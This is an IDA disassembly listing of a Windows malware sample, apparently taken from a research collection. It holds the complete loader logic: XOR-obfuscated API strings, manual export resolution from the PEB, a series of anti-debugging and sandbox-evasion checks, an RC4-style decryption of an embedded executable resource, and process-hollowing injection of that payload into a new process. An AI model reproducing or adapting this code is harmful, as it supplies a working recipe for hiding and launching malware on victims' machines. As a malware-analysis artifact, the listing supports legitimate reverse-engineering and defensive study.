;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D76FBC42ECB5BDF463327E1BBCFD1A8
; Input	CRC32 :	F01A82DC

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\0d76fbc42ecb5bdf463327e1bbcfd1a8
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00003106 (  12550.)
; Section size in file		: 00004000 (  16384.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401000	proc near		; CODE XREF: sub_401314p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, large fs:30h
		mov	eax, [eax+0Ch]
		mov	eax, [eax+14h]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	eax, [eax+10h]
		mov	[ebp+var_4], eax
		xor	eax, eax
		mov	eax, [ebp+var_4]
		leave
		retn
sub_401000	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401021	proc near		; CODE XREF: _main+84p

var_40C		= dword	ptr -40Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 40Ch
		mov	ecx, dword_406030
		push	ebx
		push	esi
		push	edi
		mov	edi, 100h
		xor	ebx, ebx
		mov	eax, edi
		xor	edx, edx
		sub	eax, ecx
		test	eax, eax
		mov	[ebp+var_C], eax
		jle	short loc_401057
		lea	esi, [ebp+var_40C]

loc_40104D:				; CODE XREF: sub_401021+34j
		mov	[esi], edx
		inc	edx
		add	esi, 4
		cmp	edx, eax
		jl	short loc_40104D

loc_401057:				; CODE XREF: sub_401021+24j
		and	[ebp+var_8], 0
		test	eax, eax
		jle	short loc_4010AA
		lea	esi, [ebp+var_40C]

loc_401065:				; CODE XREF: sub_401021+87j
		mov	eax, [ebp+var_8]
		xor	edx, edx
		div	[ebp+arg_C]
		mov	eax, [ebp+arg_4]
		movzx	eax, byte ptr [edx+eax]
		add	eax, ebx
		mov	ebx, edi
		add	eax, [esi]
		cdq
		idiv	ebx
		mov	al, [esi]
		mov	[ebp+var_1], al
		sub	edx, ecx
		inc	[ebp+var_8]
		mov	ebx, edx
		mov	edx, [ebp+ebx*4+var_40C]
		mov	[esi], edx
		add	esi, 4
		movzx	edx, [ebp+var_1]
		lea	eax, [ebp+ebx*4+var_40C]
		mov	[eax], edx
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_C]
		jl	short loc_401065

loc_4010AA:				; CODE XREF: sub_401021+3Cj
		and	[ebp+arg_C], 0
		cmp	[ebp+arg_8], 0
		jbe	short loc_401131
		jmp	short loc_4010BC
; ---------------------------------------------------------------------------

loc_4010B6:				; CODE XREF: sub_401021+10Ej
		mov	ecx, dword_406030

loc_4010BC:				; CODE XREF: sub_401021+93j
		mov	eax, [ebp+var_8]
		mov	esi, edi
		inc	eax
		cdq
		idiv	esi
		sub	edx, ecx
		mov	eax, edx
		mov	[ebp+var_8], eax
		lea	esi, [ebp+eax*4+var_40C]
		mov	eax, [ebp+eax*4+var_40C]
		add	eax, ebx
		mov	ebx, edi
		cdq
		idiv	ebx
		mov	al, [esi]
		mov	[ebp+var_1], al
		sub	edx, ecx
		mov	ebx, edx
		mov	edx, [ebp+ebx*4+var_40C]
		mov	[esi], edx
		movzx	edx, [ebp+var_1]
		lea	eax, [ebp+ebx*4+var_40C]
		mov	[ebp+arg_4], edx
		mov	[eax], edx
		mov	eax, [ebp+arg_C]
		mov	edx, [ebp+arg_0]
		add	eax, edx
		mov	[ebp+var_C], eax
		mov	eax, [esi]
		add	eax, [ebp+arg_4]
		mov	esi, edi
		cdq
		idiv	esi
		mov	eax, [ebp+var_C]
		sub	edx, ecx
		mov	cl, byte ptr [ebp+edx*4+var_40C]
		xor	[eax], cl
		inc	[ebp+arg_C]
		mov	eax, [ebp+arg_C]
		cmp	eax, [ebp+arg_8]
		jb	short loc_4010B6

loc_401131:				; CODE XREF: sub_401021+91j
		mov	eax, [ebp+arg_0]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401021	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_401139(char *Str)
sub_401139	proc near		; CODE XREF: sub_40118B+5p
					; sub_40118B+16p ...

Str		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+Str]
		push	1
		pop	esi
		push	edi		; Str
		call	_strlen
		cmp	eax, esi
		pop	ecx
		jle	short loc_40115D

loc_40114D:				; CODE XREF: sub_401139+22j
		xor	byte ptr [esi+edi], 0Ah
		push	edi		; Str
		inc	esi
		call	_strlen
		cmp	esi, eax
		pop	ecx
		jl	short loc_40114D

loc_40115D:				; CODE XREF: sub_401139+12j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_401139	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_401162(char *Str)
sub_401162	proc near		; CODE XREF: sub_40118B+5Ap

Str		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+Str]
		push	1
		pop	esi
		push	edi		; Str
		call	_strlen
		cmp	eax, esi
		pop	ecx
		jle	short loc_401186

loc_401176:				; CODE XREF: sub_401162+22j
		xor	byte ptr [esi+edi], 3
		push	edi		; Str
		inc	esi
		call	_strlen
		cmp	esi, eax
		pop	ecx
		jl	short loc_401176

loc_401186:				; CODE XREF: sub_401162+12j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_401162	endp


; =============== S U B	R O U T	I N E =======================================


sub_40118B	proc near		; CODE XREF: _main+4Cp

var_4		= dword	ptr -4

		push	offset aKoxdof98Nff ; "koxdof98$nff"
		call	sub_401139
		mov	dword_4064C0, eax
		mov	[esp+4+var_4], offset aGoZxeiknnxoyy ; "Go~ZxeiKnnxoyy"
		call	sub_401139
		mov	lpString2, eax
		mov	[esp+4+var_4], offset dword_40611C
		call	sub_401139
		mov	dword_4064D8, eax
		mov	[esp+4+var_4], offset dword_406108
		call	sub_401139
		mov	dword_4064DC, eax
		mov	[esp+4+var_4], offset aCxokOzxeioyyk ; "Cxok~oZxeioyyK"
		call	sub_401139
		mov	dword_4064EC, eax
		mov	[esp+4+var_4], offset aNwvmnbsujftlep ;	"NwVmnbsUjftLePf`wjlm"
		call	sub_401162
		mov	dword_4064AC, eax
		mov	[esp+4+var_4], offset dword_4060D0
		call	sub_401139
		mov	dword_4064D4, eax
		mov	[esp+4+var_4], offset aWxcOzxeioyygog ;	"Wxc~oZxeioyyGogexs"
		call	sub_401139
		mov	dword_40647C, eax
		mov	[esp+4+var_4], offset aGoBxokniedOr ; "Go~^bxoknIed~or~"
		call	sub_401139
		mov	dword_4064C8, eax
		mov	[esp+4+var_4], offset aSoBxokniedOr ; "So~^bxoknIed~or~"
		call	sub_401139
		mov	dword_4064D0, eax
		mov	[esp+4+var_4], offset dword_406084
		call	sub_401139
		mov	dword_4064F4, eax
		mov	[esp+4+var_4], offset dword_406074
		call	sub_401139
		mov	dword_4064A8, eax
		mov	[esp+4+var_4], offset dword_406064
		call	sub_401139
		mov	dword_406494, eax
		mov	[esp+4+var_4], offset dword_406054
		call	sub_401139
		mov	dword_4064E4, eax
		mov	[esp+4+var_4], offset dword_406044
		call	sub_401139
		mov	dword_4064B4, eax
		mov	[esp+4+var_4], offset dword_406034
		call	sub_401139
		pop	ecx
		mov	dword_4064E0, eax
		retn
sub_40118B	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40129B(int, LPCSTR lpString2)
sub_40129B	proc near		; CODE XREF: sub_401314+11p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
lpString2	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		and	[ebp+arg_0], 0
		mov	eax, [ebx+3Ch]
		push	edi
		mov	esi, [eax+ebx+78h]
		mov	eax, [esi+ebx+24h]
		add	esi, ebx
		add	eax, ebx
		mov	[ebp+var_4], eax
		mov	edi, [esi+20h]
		add	edi, ebx
		cmp	dword ptr [esi+18h], 0
		jle	short loc_4012F5

loc_4012C6:				; CODE XREF: sub_40129B+4Dj
		mov	eax, [edi]
		push	[ebp+lpString2]	; lpString2
		add	eax, ebx
		push	eax		; lpString1
		call	ds:lstrcmpA
		test	eax, eax
		jz	short loc_4012EC
		add	[ebp+var_4], 2
		add	edi, 4
		inc	[ebp+arg_0]
		mov	eax, [ebp+arg_0]
		cmp	eax, [esi+18h]
		jl	short loc_4012C6
		jmp	short loc_4012F5
; ---------------------------------------------------------------------------

loc_4012EC:				; CODE XREF: sub_40129B+3Bj
		mov	eax, [ebp+var_4]
		movzx	eax, word ptr [eax]
		mov	[ebp+lpString2], eax

loc_4012F5:				; CODE XREF: sub_40129B+29j
					; sub_40129B+4Fj
		mov	eax, [ebp+arg_0]
		cmp	eax, [esi+18h]
		jnz	short loc_401301
		xor	eax, eax
		jmp	short loc_40130F
; ---------------------------------------------------------------------------

loc_401301:				; CODE XREF: sub_40129B+60j
		mov	eax, [esi+1Ch]
		mov	ecx, [ebp+lpString2]
		lea	eax, [eax+ecx*4]
		mov	eax, [eax+ebx]
		add	eax, ebx

loc_40130F:				; CODE XREF: sub_40129B+64j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40129B	endp


; =============== S U B	R O U T	I N E =======================================


sub_401314	proc near		; CODE XREF: _main+51p
		call	sub_401000
		push	lpString2	; lpString2
		mov	dword_4064E8, eax
		push	eax		; int
		call	sub_40129B
		pop	ecx
		mov	dword_4064A4, eax
		pop	ecx
		push	dword_4064A8
		push	dword_4064E8
		call	eax
		push	dword_406494
		mov	dword_40648C, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064E4
		mov	dword_406490, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064B4
		mov	dword_4064CC, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064E0
		mov	dword_406478, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064EC
		mov	dword_406488, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064DC
		mov	dword_406474, eax
		push	dword_4064E8
		call	dword_4064A4
		push	offset aNNffNff	; "n~nff$nff"
		mov	dword_406484, eax
		call	sub_401139
		pop	ecx
		push	eax
		call	dword_406484
		push	dword_4064AC
		mov	dword_4064F0, eax
		push	eax
		call	dword_4064A4
		push	dword_4064D4
		mov	dword_4064B8, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_40647C
		mov	dword_4064A0, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064C8
		mov	dword_4064C4, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064D0
		mov	dword_406470, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064F4
		mov	dword_406498, eax
		push	dword_4064E8
		call	dword_4064A4
		push	dword_4064D8
		mov	dword_4064BC, eax
		push	dword_4064E8
		call	dword_4064A4
		mov	dword_4064B0, eax
		retn
sub_401314	endp


; =============== S U B	R O U T	I N E =======================================


sub_401482	proc near		; CODE XREF: _main+5Ep

arg_0		= dword	ptr  4

		push	esi
		push	edi
		push	offset aExe	; "EXE"
		push	309h
		push	0
		call	dword_40648C
		mov	edi, eax
		push	edi
		push	0
		call	dword_4064CC
		push	edi
		push	0
		mov	esi, eax
		call	dword_406490
		mov	ecx, [esp+8+arg_0]
		push	esi
		mov	[ecx], eax
		call	dword_406478
		push	esi
		call	dword_406488
		mov	eax, esi
		pop	edi
		pop	esi
		retn
sub_401482	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4014C5	proc near		; CODE XREF: _main+9Ap

var_428		= dword	ptr -428h
var_378		= dword	ptr -378h
var_15C		= byte ptr -15Ch
Dst		= dword	ptr -58h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 428h
		mov	eax, 0B6779h
		push	ebx
		cmp	dword_406030, eax
		push	esi
		push	edi
		jnz	loc_401626
		push	44h
		pop	esi
		push	esi		; Size
		push	eax		; Val
		lea	eax, [ebp+Dst]
		push	eax		; Dst
		call	_memset
		mov	edi, [ebp+arg_0]
		mov	eax, dword_406030
		add	esp, 0Ch
		mov	[ebp+Dst], esi
		lea	ebx, [eax+edi]
		mov	[ebp+var_428], 10007h
		cmp	word ptr [ebx],	5A4Dh
		jnz	short loc_40151F
		mov	esi, [ebx+3Ch]
		add	esi, edi
		cmp	dword ptr [esi], 4550h
		jz	short loc_401526

loc_40151F:				; CODE XREF: sub_4014C5+4Bj
		xor	al, al
		jmp	loc_401628
; ---------------------------------------------------------------------------

loc_401526:				; CODE XREF: sub_4014C5+58j
		lea	eax, [ebp+var_15C]
		push	104h
		push	eax
		push	0
		call	dword_4064B0
		lea	eax, [ebp+var_14]
		lea	ecx, [ebp+var_15C]
		push	eax
		lea	eax, [ebp+Dst]
		push	eax
		xor	eax, eax
		push	eax
		push	eax
		push	4
		push	eax
		push	eax
		push	eax
		push	ecx
		push	eax
		call	dword_406474
		cmp	eax, 1
		jnz	short loc_40156A
		push	dword ptr [esi+34h]
		push	[ebp+var_14]
		call	dword_4064B8

loc_40156A:				; CODE XREF: sub_4014C5+97j
		push	40h
		push	3000h
		push	dword ptr [esi+50h]
		push	dword ptr [esi+34h]
		push	[ebp+var_14]
		call	dword_4064A0
		mov	eax, dword_406030
		push	0
		push	dword ptr [esi+54h]
		add	eax, edi
		push	eax
		push	dword ptr [esi+34h]
		push	[ebp+var_14]
		call	dword_4064C4
		cmp	eax, 1
		jnz	short loc_4015EC
		xor	eax, eax
		cmp	[esi+6], ax
		mov	[ebp+var_4], eax
		jbe	short loc_4015EC
		mov	[ebp+arg_0], eax

loc_4015AC:				; CODE XREF: sub_4014C5+125j
		mov	eax, [ebp+arg_0]
		push	0
		add	eax, [ebx+3Ch]
		push	dword ptr [eax+edi+108h]
		mov	ecx, [eax+edi+10Ch]
		lea	eax, [eax+edi+0F8h]
		add	ecx, edi
		push	ecx
		mov	eax, [eax+0Ch]
		add	eax, [esi+34h]
		push	eax
		push	[ebp+var_14]
		call	dword_4064C4
		movzx	eax, word ptr [esi+6]
		inc	[ebp+var_4]
		add	[ebp+arg_0], 28h
		cmp	[ebp+var_4], eax
		jl	short loc_4015AC

loc_4015EC:				; CODE XREF: sub_4014C5+D7j
					; sub_4014C5+E2j
		lea	eax, [ebp+var_428]
		push	eax
		push	[ebp+var_10]
		call	dword_406470
		cmp	eax, 1
		jnz	short loc_401626
		mov	eax, [esi+28h]
		add	eax, [esi+34h]
		mov	[ebp+var_378], eax
		lea	eax, [ebp+var_428]
		push	eax
		push	[ebp+var_10]
		call	dword_406498
		push	[ebp+var_10]
		call	dword_4064BC

loc_401626:				; CODE XREF: sub_4014C5+17j
					; sub_4014C5+13Aj
		mov	al, 1

loc_401628:				; CODE XREF: sub_4014C5+5Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4014C5	endp


; =============== S U B	R O U T	I N E =======================================


sub_40162D	proc near		; CODE XREF: _main+4p
		mov	ecx, 389ACCBh

loc_401632:				; CODE XREF: sub_40162D+Dj
		mov	eax, 0
		push	eax
		pop	eax
		dec	ecx
		jnz	short loc_401632
		retn
sub_40162D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40163D	proc near		; CODE XREF: _main+13p

Dst		= byte ptr -224h
CmdLine		= byte ptr -120h
Buffer		= byte ptr -18h
var_8		= dword	ptr -8
nSize		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 224h
		push	ebx
		push	esi
		push	edi
		push	offset ProcName	; "CsrGetProcessId"
		push	offset LibFileName ; "ntdll.dll"
		call	ds:GetModuleHandleA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	edi, eax
		lea	eax, [ebp+CmdLine]
		push	105h		; uSize
		push	eax		; lpBuffer
		call	ds:GetSystemDirectoryA
		lea	eax, [ebp+CmdLine]
		push	3		; Size
		push	eax		; Src
		lea	eax, [ebp+Dst]
		push	eax		; Dst
		call	_memcpy
		add	esp, 0Ch
		xor	esi, esi
		lea	eax, [ebp+Dst]
		push	esi		; nFileSystemNameSize
		push	esi		; lpFileSystemNameBuffer
		push	esi		; lpFileSystemFlags
		push	esi		; lpMaximumComponentLength
		push	esi		; lpVolumeSerialNumber
		push	esi		; nVolumeNameSize
		push	esi		; lpVolumeNameBuffer
		push	eax		; lpRootPathName
		call	ds:GetVolumeInformationA
		mov	ebx, eax
		lea	eax, [ebp+CmdLine]
		push	offset Source	; "\\winlogon.exe"
		push	eax		; Dest
		call	_strcat
		pop	ecx
		lea	eax, [ebp+CmdLine]
		pop	ecx
		push	esi		; uCmdShow
		push	eax		; lpCmdLine
		call	ds:WinExec
		mov	[ebp+var_8], eax
		lea	eax, [ebp+nSize]
		push	eax		; nSize
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	[ebp+nSize], 10h
		call	ds:GetComputerNameA
		call	ds:GetCurrentProcessId
		test	eax, eax
		jbe	short loc_40170A
		call	ds:GetCurrentThreadId
		test	eax, eax
		jbe	short loc_40170A
		call	edi
		test	eax, eax
		jbe	short loc_40170A
		cmp	[ebp+var_8], 1Fh
		jbe	short loc_40170A
		cmp	ebx, esi
		jbe	short loc_40170A
		cmp	[ebp+nSize], esi
		jbe	short loc_40170A
		xor	al, al
		jmp	short loc_40170C
; ---------------------------------------------------------------------------

loc_40170A:				; CODE XREF: sub_40163D+A8j
					; sub_40163D+B2j ...
		mov	al, 1

loc_40170C:				; CODE XREF: sub_40163D+CBj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40163D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_401711	proc near		; CODE XREF: _main+ACp
		push	esi
		push	edi
		xor	edi, edi
		push	edi		; lpArguments
		push	edi		; nNumberOfArguments
		push	edi		; dwExceptionFlags
		push	0DEADh		; dwExceptionCode
		call	ds:RaiseException
		call	ds:GetCurrentProcessId
		push	eax		; dwProcessId
		push	edi		; bInheritHandle
		push	1		; dwDesiredAccess
		call	ds:OpenProcess
		mov	esi, eax
		cmp	esi, edi
		jz	short loc_401748
		push	edi		; uExitCode
		push	esi		; hProcess
		call	ds:TerminateProcess
		push	esi		; hObject
		call	ds:CloseHandle

loc_401748:				; CODE XREF: sub_401711+26j
		push	edi		; dwExitCode
		call	ds:ExitThread
sub_401711	endp

; ---------------------------------------------------------------------------
		push	edi
		call	ds:ExitProcess
; ---------------------------------------------------------------------------
		pop	edi
		pop	esi
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401759	proc near		; CODE XREF: _main+20p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	offset LibFileName ; "ntdll.dll"
		call	ds:LoadLibraryA
		push	offset aNtqueryinforma ; "NtQueryInformationProcess"
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+var_8], eax
		lea	eax, [ebp+var_4]
		mov	[ebp+var_C], eax
		push	0
		push	4
		push	[ebp+var_C]
		push	7
		push	0FFFFFFFFh
		call	[ebp+var_8]
		cmp	[ebp+var_4], 0
		setnz	al
		leave
		retn
sub_401759	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401796	proc near		; CODE XREF: _main+29p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		mov	eax, large fs:30h
		mov	eax, [eax+68h]
		mov	[ebp+var_4], eax
		test	byte ptr [ebp+var_4], 70h
		setnz	al
		leave
		retn
sub_401796	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: sub_40180A+5o

var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset dword_4050C8
		push	offset unknown_libname_1 ; Microsoft VisualC 2-10/net runtime
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_18], esp
		and	[ebp+var_4], 0
		int	3		; Trap to Debugger
		jmp	short loc_4017F0
; ---------------------------------------------------------------------------
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp+var_18]
		mov	dword_4064F8, 1

loc_4017F0:				; CODE XREF: StartAddress+2Aj
		or	[ebp+var_4], 0FFFFFFFFh
		mov	byte_4064FC, 1
		mov	ecx, [ebp+var_10]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
StartAddress	endp


; =============== S U B	R O U T	I N E =======================================


sub_40180A	proc near		; CODE XREF: _main+32p
		xor	eax, eax
		push	eax		; lpThreadId
		push	eax		; dwCreationFlags
		push	eax		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	eax		; dwStackSize
		push	eax		; lpThreadAttributes
		call	ds:CreateThread
		push	1
		pop	eax
		cmp	byte_4064FC, al
		jnz	short loc_40182F
		cmp	dword_4064F8, eax
		jnz	short locret_401831

loc_40182F:				; CODE XREF: sub_40180A+1Bj
		xor	al, al

locret_401831:				; CODE XREF: sub_40180A+23j
		retn
sub_40180A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl main(int argc, const char	**argv,	const char **envp)
_main		proc near		; CODE XREF: start+AFp

var_C		= dword	ptr -0Ch
Str		= byte ptr -4
argc		= dword	ptr  8
argv		= dword	ptr  0Ch
envp		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		call	sub_40162D
		mov	dword_406030, 76D056h
		call	sub_40163D
		cmp	al, 1
		jz	loc_4018D4
		call	sub_401759
		cmp	al, 1
		jz	short loc_4018D4
		call	sub_401796
		cmp	al, 1
		jz	short loc_4018D4
		call	sub_40180A
		cmp	al, 1
		jz	short loc_4018D4
		call	sub_4018E5
		cmp	al, 1
		jz	short loc_4018D4
		and	dword_406030, 0
		push	esi
		call	sub_40118B
		call	sub_401314
		and	dword ptr [ebp+Str], 0
		lea	eax, [ebp+Str]
		push	eax		; Str
		call	sub_401482
		mov	esi, eax
		mov	[esp+0Ch+var_C], offset	a9n4m506m04707y	; "9N4M506M04707Y8080G80g08g80G80G0jmM87Yn"...
		call	_strlen
		push	eax
		mov	eax, dword_406030
		push	dword ptr [ebp+Str]
		lea	ecx, a9n4m506m04707y[eax] ; "9N4M506M04707Y8080G80g08g80G80G0jmM87Yn"...
		add	eax, esi
		push	ecx
		push	eax
		call	sub_401021
		add	esp, 14h
		test	eax, eax
		pop	esi
		jz	short locret_4018E3
		mov	ecx, dword_406030
		add	ecx, eax
		push	ecx
		call	sub_4014C5
		pop	ecx
		leave
		retn
; ---------------------------------------------------------------------------

loc_4018D4:				; CODE XREF: _main+1Aj	_main+27j ...
		mov	dword_406030, 1C4Fh
		call	sub_401711
; ---------------------------------------------------------------------------

locret_4018E3:				; CODE XREF: _main+8Fj
		leave
		retn
_main		endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4018E5	proc near		; CODE XREF: _main+3Bp

var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset dword_4050D8
		push	offset unknown_libname_1 ; Microsoft VisualC 2-10/net runtime
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_18], esp
		and	[ebp+var_4], 0
		push	8000h		; hObject
		call	ds:CloseHandle
		or	[ebp+var_4], 0FFFFFFFFh
		xor	al, al
		jmp	short loc_40192F
; ---------------------------------------------------------------------------
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp+var_18]
		or	[ebp+var_4], 0FFFFFFFFh
		mov	al, 1

loc_40192F:				; CODE XREF: sub_4018E5+3Bj
		mov	ecx, [ebp+var_10]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4018E5	endp

; ---------------------------------------------------------------------------
		align 10h
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+"	TO EXPAND]
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD "+" TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler.	PRESS KEYPAD "+" TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+"	TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

__NLG_Notify1:
		push	ebx
		push	ecx
		mov	ebx, offset dword_406230
		jmp	short loc_401F28
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO	EXPAND]
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

unknown_libname_2:			; Microsoft VisualC 2-10/net runtime
		push	ebp
		mov	ecx, [esp+8]
		mov	ebp, [ecx]
		mov	eax, [ecx+1Ch]
		push	eax
		mov	eax, [ecx+18h]
		push	eax
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		retn	4
; [000000C0 BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, [ebp-14h]
		mov	ecx, [eax]
		mov	ecx, [ecx]
		mov	[ebp-20h], ecx
		push	eax
		push	ecx
		call	__XcptFilter
		pop	ecx
		pop	ecx
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-20h]
		call	__exit
; [00000022 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------
		pop	ecx
		pop	ecx
		retn
; [00000023 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		retn
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO	EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	"+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD "+" TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	"+" TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD "+" TO	EXPAND]
